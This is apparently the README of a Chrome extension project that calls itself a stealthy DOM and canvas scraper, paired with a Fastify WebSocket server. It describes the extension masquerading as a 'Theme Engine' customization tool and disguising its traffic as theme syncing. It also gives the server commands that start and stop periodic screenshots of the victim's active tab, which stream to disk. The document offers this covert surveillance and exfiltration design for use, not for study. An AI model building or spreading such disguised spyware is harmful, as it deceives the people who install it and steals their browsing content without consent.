# Stealth DOM & Canvas Scraper (Theme Engine Disguise)

This project contains a high-performance, stealthy DOM and Canvas scraper packaged as a Google Chrome Extension, disguised as a UI Customization tool. It pairs with a Fastify WebSocket server for high-frequency data ingestion and bridging.

## Architecture

The project is split into two completely isolated environments:

### `/extension` (The Client)
A **Manifest V3** Chrome extension masquerading as a "Theme Engine".
* **`WebSocketManager`**: Maintains a robust, compressed (`fflate`), auto-reconnecting WebSocket connection to the server. Uses background pings to keep the Service Worker alive.
* **`ScreenshotManager`**: Subscribes to Server commands (`CMD_START_SCREENSHOTS`) to natively capture `<activeTab>` visible area as compressed WebPs/JPEGs without causing Page-level frame drops or using heavy injected canvas sniffers.

### `/server` (The Backend)
A low-latency, scalable **Node.js Fastify** Backend.
* **WebSocket Ingestion**: Listens natively on `/stream`. Verifies custom API Keys over URL query parameters (`?api_key=...&session_id=...`).
* **The Message Router**: Strict separation of concerns.
  * `TYPE_DOM_MUTATION` -> Flushed to a lightweight local SQLite database (`buffer.db`) timeline.
  * `TYPE_CANVAS_SNAPSHOT` -> Streamed directly to disk (`storage/snapshots/`) to keep DB lean.
* **The Heartbeat Monitor**: Disconnects and wraps up sessions that go dark for >30 seconds.
* **Translation Hook**: Sends `TYPE_UI_CONFIG` payload to mask the WebSocket traffic as legitimate bidirectional theme syncing.

---

## Quickstart

### 1. Server Setup
\`\`\`bash
cd server
npm install
npm run dev
\`\`\`
*(Server runs on http://127.0.0.1:3000)*

### 2. Extension Setup
1. Open Google Chrome and go to `chrome://extensions/`
2. Enable **Developer mode**.
3. Click **Load unpacked** and select the `extension/` folder in this project.
4. Pin the extension.

### 3. Usage & Triggers
The extension will automatically connect to the server when booted. 
To start continuous screen captures (e.g. every 10 seconds), you can inject the following payload down the web socket to the target Session ID:

\`\`\`json
{
  "type": "CMD_START_SCREENSHOTS",
  "payload": {
    "interval": 10000 
  }
}
\`\`\`

To stop capturing:
\`\`\`json
{
  "type": "CMD_STOP_SCREENSHOTS"
}
\`\`\`
